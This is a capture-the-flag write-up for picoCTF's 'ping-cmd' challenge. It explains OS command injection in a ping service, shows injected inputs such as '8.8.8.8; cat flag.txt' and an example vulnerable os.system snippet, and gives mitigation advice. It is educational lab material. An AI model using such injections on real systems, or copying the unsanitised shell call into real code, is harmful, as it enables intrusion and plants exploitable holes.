# ping-cmd — picoCTF 2026

## Challenge Info

| Field | Details |
|-------|---------|
| **Category** | General Skills |
| **Difficulty** | Easy |
| **Points** | 100 |
| **Solves** | 5,296 |
| **Author** | picoCTF |

## Description

> Can you make the server reveal its secrets? It seems to be able to ping Google DNS, but what happens if you get a little creative with your input?
> Connect to the service: `nc <host> <port>`

---

## Objective

Exploit an **OS command injection** vulnerability in a ping service to read `flag.txt` from the server.

---

## Tools Used

- `netcat (nc)` — connect to the service
- Knowledge of **command injection** with shell metacharacters (`;`, `&&`, `|`)

---

## Understanding the Vulnerability

The server runs something like:

```python
import os
user_input = input("Enter IP: ")
os.system(f"ping -c 2 {user_input}")
```

User input is passed **directly** to the shell without sanitisation. The service claims to only allow `8.8.8.8`, but the actual check is insufficient — it doesn't prevent additional commands being chained after a valid IP using the `;` separator.

---

## Solution

### Step 1 — Connect to the service

```bash
nc <host> <port>
```

Output:
```
Enter an IP address to ping! (We have tight security because we only allow '8.8.8.8'):
```

### Step 2 — Test command injection with `ls`

```
==> 8.8.8.8; ls
```

The server executes both `ping 8.8.8.8` AND `ls`. Output shows:

```
--- 8.8.8.8 ping statistics ---
...
flag.txt
script.sh
```

This confirms command injection works — we can see `flag.txt` exists.

### Step 3 — Read the flag

```
==> 8.8.8.8; cat flag.txt
```

Output:
```
--- 8.8.8.8 ping statistics ---
...
picoCTF{...}
```

> **Screenshot:** See `screenshots/command-injection.png`

---

## Key Takeaways

- **OS Command Injection** (CWE-78) is one of the most critical and commonly exploited web/network vulnerabilities. It occurs when user input is embedded directly into shell commands.
- The `;` character in bash separates commands — `cmd1; cmd2` runs both regardless of `cmd1`'s success.
- **Mitigation:** Never pass raw user input to `os.system()` or similar. Use `subprocess.run()` with a list of arguments (not a string), which prevents shell interpretation.
- This class of vulnerability is also found in web applications (e.g., PHP `exec()` calls) and is listed in the **OWASP Top 10**.
- Tools like **Burp Suite** and **commix** automate detection of command injection in real penetration testing scenarios.

---

## References

- [OWASP - OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-78: Improper Neutralization of Special Elements in OS Commands](https://cwe.mitre.org/data/definitions/78.html)
- [Python subprocess documentation](https://docs.python.org/3/library/subprocess.html)

---

*[← Back to index](../../README.md)*
